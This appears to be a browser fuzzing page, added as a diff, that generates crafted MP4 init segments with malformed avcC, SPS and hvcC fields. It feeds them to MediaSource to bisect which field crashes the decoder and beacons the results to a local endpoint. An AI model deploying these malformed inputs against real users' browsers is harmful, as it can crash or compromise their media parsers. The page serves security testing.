@@ -1,0 +1,451 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1066</title>
+<style>
+body{background:#0a0e14;color:#c8d0da;font:11px/1.5 monospace;padding:10px;margin:0}
+#hud{background:#111820;border:1px solid #1e2a3a;border-radius:6px;padding:10px;max-height:95vh;overflow-y:auto}
+.ok{color:#4ec9b0}.err{color:#f44747}.warn{color:#dcdcaa}.hot{color:#ff6b6b;font-weight:bold}
+</style></head><body><div id="hud"><div id="log"></div></div>
+<script>
+var _rl='';
+setInterval(function(){
+  try{var x=new XMLHttpRequest();x.open('GET','/reload.txt?'+Date.now(),false);x.send();
+    if(x.status===200){var v=x.responseText.trim();if(_rl&&v!==_rl)location.reload(true);_rl=v;}
+  }catch(e){}
+},2500);
+
+var L=document.getElementById('log');
+function log(s,c){var d=document.createElement('div');d.className=c||'';d.textContent=s;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon.php?tag=P1066-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,1800))+'&t='+Date.now(),false);x.send();}catch(e){}}
+
+bn('BOOT','avcc-crash-bisect');
+log('P1066: avcC Crash Bisect - Finding exact crash field','warn');
+
+// MP4 box helpers
+function u32be(n){return new Uint8Array([(n>>>24)&0xFF,(n>>>16)&0xFF,(n>>>8)&0xFF,n&0xFF]);}
+function u16be(n){return new Uint8Array([(n>>>8)&0xFF,n&0xFF]);}
+function u8(n){return new Uint8Array([n&0xFF]);}
+function concat(){var a=arguments,t=0,i,j;for(i=0;i<a.length;i++)if(a[i])t+=a[i].length;var r=new Uint8Array(t);var o=0;for(i=0;i<a.length;i++)if(a[i])for(j=0;j<a[i].length;j++)r[o++]=a[i][j];return r;}
+function ascii(s){var a=new Uint8Array(s.length);for(var i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return a;}
+function mkBox(t,p){var a=ascii(t);var s=8+(p?p.length:0);return concat(u32be(s),a,p||new Uint8Array(0));}
+function zeros(n){return new Uint8Array(n);}
+
+// Build ftyp
+function mkFtyp(){return mkBox('ftyp',concat(ascii('isom'),u32be(0x200),ascii('isom'),ascii('mp41')));}
+
+// Build mvhd (version 0, 96 bytes of payload)
+function mkMvhd(){
+  var p=new Uint8Array(96);
+  // version=0, flags=0 (4 bytes) already zero
+  // timescale at offset 12 = 1000
+  p[14]=0x03;p[15]=0xE8;
+  // duration at offset 16 = 1000
+  p[18]=0x03;p[19]=0xE8;
+  // rate at offset 20 = 0x00010000 (1.0)
+  p[20]=0x00;p[21]=0x01;
+  // volume at offset 24 = 0x0100 (1.0)
+  p[24]=0x01;
+  // matrix (36 bytes at offset 32): identity
+  p[36]=0x00;p[37]=0x01; // a=1.0
+  p[52]=0x00;p[53]=0x01; // d=1.0
+  p[68]=0x40; // w=1.0 (0x40000000)
+  // next_track_id at offset 92 = 2
+  p[95]=0x02;
+  return mkBox('mvhd',p);
+}
+
+// Build tkhd
+function mkTkhd(){
+  var p=new Uint8Array(80);
+  // version=0, flags=3 (track enabled + in movie)
+  p[3]=0x03;
+  // track_id at offset 12 = 1
+  p[15]=0x01;
+  // duration at offset 20 = 1000
+  p[22]=0x03;p[23]=0xE8;
+  // width at offset 72 = 320 (0x01400000)
+  p[72]=0x01;p[73]=0x40;
+  // height at offset 76 = 240 (0x00F00000)
+  p[76]=0x00;p[77]=0xF0;
+  return mkBox('tkhd',p);
+}
+
+// Build mdhd
+function mkMdhd(){
+  var p=new Uint8Array(24);
+  // timescale at offset 12 = 30000
+  p[12]=0x00;p[13]=0x00;p[14]=0x75;p[15]=0x30;
+  // duration at offset 16 = 30000
+  p[16]=0x00;p[17]=0x00;p[18]=0x75;p[19]=0x30;
+  return mkBox('mdhd',p);
+}
+
+// Build hdlr for video
+function mkHdlr(){
+  var p=concat(
+    zeros(4),        // version+flags
+    zeros(4),        // pre_defined
+    ascii('vide'),   // handler_type
+    zeros(12),       // reserved
+    ascii('VideoHandler'),
+    u8(0)            // null terminator
+  );
+  return mkBox('hdlr',p);
+}
+
+// Build vmhd
+function mkVmhd(){
+  return mkBox('vmhd',concat(u32be(0x01),zeros(8))); // version=0,flags=1, graphicsmode+opcolor
+}
+
+// Build dinf/dref
+function mkDinf(){
+  var url_entry=mkBox('url ',concat(u32be(0x01))); // self-contained flag
+  var dref=mkBox('dref',concat(u32be(0),u32be(1),url_entry));
+  return mkBox('dinf',dref);
+}
+
+// === Incremental avc1 sample entry builders ===
+
+// Level 1: stsd with avc1 entry - just the fixed fields (no avcC)
+function mkAvc1Bare(){
+  var p=concat(
+    zeros(6),        // reserved
+    u16be(1),        // data_reference_index = 1
+    zeros(16),       // pre_defined + reserved
+    u16be(320),      // width
+    u16be(240),      // height
+    u32be(0x00480000), // horizresolution 72dpi
+    u32be(0x00480000), // vertresolution 72dpi
+    u32be(0),        // reserved
+    u16be(1),        // frame_count
+    zeros(32),       // compressorname
+    u16be(0x0018),   // depth = 24
+    u16be(0xFFFF)    // pre_defined = -1
+  );
+  return mkBox('avc1',p);
+}
+
+// Level 2: avc1 with minimal avcC (no SPS/PPS)
+function mkAvc1MinimalAvcC(){
+  var avcC_payload=concat(
+    u8(1),           // configurationVersion = 1
+    u8(0x42),        // AVCProfileIndication = Baseline
+    u8(0xE0),        // profile_compatibility
+    u8(0x1E),        // AVCLevelIndication = 3.0
+    u8(0xFF),        // lengthSizeMinusOne = 3 (NALU length = 4 bytes)
+    u8(0xE0),        // numOfSequenceParameterSets = 0
+    u8(0x00)         // numOfPictureParameterSets = 0
+  );
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC_payload)));
+}
+
+// Level 3: avcC with 1 minimal SPS (no PPS)
+function mkAvc1SpsOnly(){
+  // Minimal SPS: nal_unit_type=7 (SPS), profile_idc=66 (Baseline), level=30
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var avcC_payload=concat(
+    u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),        // numSPS = 1
+    u16be(sps.length),
+    sps,
+    u8(0x00)         // numPPS = 0
+  );
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC_payload)));
+}
+
+// Level 4: avcC with SPS + PPS (complete)
+function mkAvc1Full(){
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var pps=new Uint8Array([0x68,0xCE,0x38,0x80]);
+  var avcC_payload=concat(
+    u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),u16be(sps.length),sps,
+    u8(0x01),u16be(pps.length),pps
+  );
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC_payload)));
+}
+
+// Level 5: avcC with oversized SPS length (attack vector)
+function mkAvc1OversizedSps(){
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8]);
+  var avcC_payload=concat(
+    u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),
+    u16be(0x4000),   // Claim SPS is 16384 bytes but only provide 8
+    sps,
+    u8(0x00)
+  );
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC_payload)));
+}
+
+// Level 6: avcC with 32 SPS entries (stress numSPS)
+function mkAvc1ManySps(){
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var parts=[u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF)];
+  parts.push(u8(0xE0|31)); // numSPS = 31
+  for(var i=0;i<31;i++){parts.push(u16be(sps.length));parts.push(sps);}
+  parts.push(u8(0));
+  var avcC_payload=concat.apply(null,parts);
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC_payload)));
+}
+
+// Level 7: avcC with SPS containing crafted exp-golomb overflow
+function mkAvc1ExpGolombOverflow(){
+  // SPS with very large pic_width_in_mbs_minus1 via exp-golomb
+  // Leading zeros in exp-golomb = large value
+  var sps=new Uint8Array([
+    0x67,0x42,0xE0,0x1E,
+    0x00,0x00,0x00,0x01, // Many leading zeros in exp-golomb = huge value
+    0xFF,0xFF,0xFF,0xFF,
+    0x80,0x00,0x00,0x00
+  ]);
+  var pps=new Uint8Array([0x68,0xCE,0x38,0x80]);
+  var avcC_payload=concat(
+    u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),u16be(sps.length),sps,
+    u8(0x01),u16be(pps.length),pps
+  );
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC_payload)));
+}
+
+// Level 8: HEVC (hev1) with minimal hvcC
+function mkHev1Minimal(){
+  var hvcC_payload=concat(
+    u8(1),           // configurationVersion
+    u8(0x60),        // general_profile_space=0, tier=0, profile_idc=0
+    u32be(0),        // general_profile_compatibility_flags
+    zeros(6),        // general_constraint_indicator_flags
+    u8(0x5D),        // general_level_idc = 93 (level 3.1)
+    u16be(0xF000),   // min_spatial_segmentation_idc
+    u8(0xFC),        // parallelismType
+    u8(0xFD),        // chromaFormat
+    u8(0xF8),        // bitDepthLumaMinus8
+    u8(0xF8),        // bitDepthChromaMinus8
+    u16be(0),        // avgFrameRate
+    u8(0x0F),        // constantFrameRate=0, numTemporalLayers=1, temporalIdNested=1, lengthSizeMinusOne=3
+    u8(0)            // numOfArrays = 0
+  );
+  var fixed=concat(
+    zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF)
+  );
+  return mkBox('hev1',concat(fixed,mkBox('hvcC',hvcC_payload)));
+}
+
+// Build stbl with a given sample entry
+function mkStbl(sampleEntry){
+  var stsd=mkBox('stsd',concat(u32be(0),u32be(1),sampleEntry));
+  var stts=mkBox('stts',concat(u32be(0),u32be(0))); // no entries
+  var stsc=mkBox('stsc',concat(u32be(0),u32be(0)));
+  var stsz=mkBox('stsz',concat(u32be(0),u32be(0),u32be(0)));
+  var stco=mkBox('stco',concat(u32be(0),u32be(0)));
+  return mkBox('stbl',concat(stsd,stts,stsc,stsz,stco));
+}
+
+// Build complete init segment with given sample entry
+function mkInit(sampleEntry){
+  var ftyp=mkFtyp();
+  var mvhd=mkMvhd();
+  var tkhd=mkTkhd();
+  var mdhd=mkMdhd();
+  var hdlr=mkHdlr();
+  var vmhd=mkVmhd();
+  var dinf=mkDinf();
+  var stbl=mkStbl(sampleEntry);
+  var minf=mkBox('minf',concat(vmhd,dinf,stbl));
+  var mdia=mkBox('mdia',concat(mdhd,hdlr,minf));
+  var trak=mkBox('trak',concat(tkhd,mdia));
+  var moov=mkBox('moov',concat(mvhd,trak));
+  return concat(ftyp,moov);
+}
+
+// Test queue
+var tests=[];
+var tidx=0;
+var results=[];
+
+function addTest(id,genFn){tests.push({id:id,gen:genFn});}
+
+// === TESTS: Bisect from bare avc1 to full avcC ===
+addTest('A1-AVC1-BARE',mkAvc1Bare);
+addTest('A2-AVCC-NOSPS',mkAvc1MinimalAvcC);
+addTest('A3-AVCC-SPS-ONLY',mkAvc1SpsOnly);
+addTest('A4-AVCC-FULL',mkAvc1Full);
+addTest('A5-AVCC-OVERSIZED-SPS',mkAvc1OversizedSps);
+addTest('A6-AVCC-MANY-SPS',mkAvc1ManySps);
+addTest('A7-AVCC-EXPGOLOMB',mkAvc1ExpGolombOverflow);
+addTest('A8-HEV1-MINIMAL',mkHev1Minimal);
+
+// === TESTS: Specific field mutations on the full avcC ===
+// B series: mutate individual fields of a valid avcC to find triggers
+
+addTest('B1-PROFILE-HIGH',function(){
+  // Change profile from Baseline(66) to High(100)
+  var sps=new Uint8Array([0x67,0x64,0x00,0x1F,0xAC,0xD9,0x40,0x50,0x05,0xBB,0x01,0x10]);
+  var pps=new Uint8Array([0x68,0xEB,0xE3,0xCB,0x22,0xC0]);
+  var avcC=concat(u8(1),u8(0x64),u8(0x00),u8(0x1F),u8(0xFF),
+    u8(0xE1),u16be(sps.length),sps,u8(0x01),u16be(pps.length),pps);
+  var fixed=concat(zeros(6),u16be(1),zeros(16),u16be(1920),u16be(1080),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF));
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC)));
+});
+
+addTest('B2-ZERO-DIMENSIONS',function(){
+  // Width=0, Height=0 in avc1 header
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var pps=new Uint8Array([0x68,0xCE,0x38,0x80]);
+  var avcC=concat(u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),u16be(sps.length),sps,u8(0x01),u16be(pps.length),pps);
+  var fixed=concat(zeros(6),u16be(1),zeros(16),u16be(0),u16be(0),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF));
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC)));
+});
+
+addTest('B3-HUGE-DIMENSIONS',function(){
+  // Width=65535, Height=65535
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var pps=new Uint8Array([0x68,0xCE,0x38,0x80]);
+  var avcC=concat(u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),u16be(sps.length),sps,u8(0x01),u16be(pps.length),pps);
+  var fixed=concat(zeros(6),u16be(1),zeros(16),u16be(0xFFFF),u16be(0xFFFF),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF));
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC)));
+});
+
+addTest('B4-LENGTHSIZE-0',function(){
+  // lengthSizeMinusOne = 0 (1-byte NALU lengths, unusual)
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var pps=new Uint8Array([0x68,0xCE,0x38,0x80]);
+  var avcC=concat(u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFC),
+    u8(0xE1),u16be(sps.length),sps,u8(0x01),u16be(pps.length),pps);
+  var fixed=concat(zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF));
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC)));
+});
+
+addTest('B5-VERSION-255',function(){
+  // configurationVersion = 255 (invalid)
+  var sps=new Uint8Array([0x67,0x42,0xE0,0x1E,0xDA,0x02,0xC0,0xA8,0x06,0x60]);
+  var pps=new Uint8Array([0x68,0xCE,0x38,0x80]);
+  var avcC=concat(u8(0xFF),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),u16be(sps.length),sps,u8(0x01),u16be(pps.length),pps);
+  var fixed=concat(zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF));
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC)));
+});
+
+addTest('B6-SPS-TRUNCATED',function(){
+  // SPS length says 10 but only 3 bytes provided (inside avcC box)
+  var avcC=concat(u8(1),u8(0x42),u8(0xE0),u8(0x1E),u8(0xFF),
+    u8(0xE1),u16be(10),new Uint8Array([0x67,0x42,0xE0]),
+    u8(0x00));
+  var fixed=concat(zeros(6),u16be(1),zeros(16),u16be(320),u16be(240),
+    u32be(0x00480000),u32be(0x00480000),u32be(0),u16be(1),
+    zeros(32),u16be(0x0018),u16be(0xFFFF));
+  return mkBox('avc1',concat(fixed,mkBox('avcC',avcC)));
+});
+
+addTest('B7-AUDIO-CODEC-IN-VIDEO',function(){
+  // mp4a sample entry in video SourceBuffer
+  var esds_data=concat(
+    u32be(0), // version+flags
+    // ES_Descriptor tag=3
+    new Uint8Array([0x03,0x19,0x00,0x01,0x00,
+    // DecoderConfigDescriptor tag=4
+    0x04,0x11,0x40,0x15,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+    // DecoderSpecificInfo tag=5
+    0x05,0x02,0x12,0x10,
+    // SLConfigDescriptor tag=6
+    0x06,0x01,0x02])
+  );
+  var fixed=concat(zeros(6),u16be(1),zeros(8),u16be(2),u16be(16),zeros(4),u16be(44100),zeros(2));
+  return mkBox('mp4a',concat(fixed,mkBox('esds',esds_data)));
+});
+
+// Run tests sequentially
+function runTest(){
+  if(tidx>=tests.length){
+    var s=results.map(function(r){return r.id+':'+r.res;}).join('|');
+    bn('DONE','total='+tests.length+'|'+s);
+    log('DONE: '+tests.length+' tests, results sent','ok');
+    return;
+  }
+  var t=tests[tidx];
+  log('['+(tidx+1)+'/'+tests.length+'] '+t.id,'warn');
+  bn('PRE-'+t.id,'starting');
+
+  setTimeout(function(){
+    var ms=new MediaSource();
+    var vid=document.createElement('video');
+    vid.src=URL.createObjectURL(ms);
+
+    var done=false;
+    function finish(res){
+      if(done)return;
+      done=true;
+      results.push({id:t.id,res:res});
+      bn('POST-'+t.id,res);
+      log('  -> '+res, res.indexOf('OK')>=0||res.indexOf('error-event')>=0?'ok':'err');
+      URL.revokeObjectURL(vid.src);
+      vid.src='';
+      tidx++;
+      setTimeout(runTest,400);
+    }
+
+    ms.addEventListener('sourceopen',function(){
+      try{
+        var sb=ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+        var sampleEntry=typeof t.gen==='function'?t.gen():null;
+        if(!sampleEntry){finish('ERR-no-entry');return;}
+
+        sb.addEventListener('updateend',function(){finish('OK-updateend');});
+        sb.addEventListener('error',function(){finish('OK-error-event');});
+
+        var initSeg=mkInit(sampleEntry);
+        sb.appendBuffer(initSeg);
+      }catch(e){
+        finish('CATCH:'+e.name+':'+e.message);
+      }
+    });
+
+    setTimeout(function(){finish('TIMEOUT-3s');},3000);
+  },200);
+}
+
+setTimeout(runTest,400);
+</script></body></html>
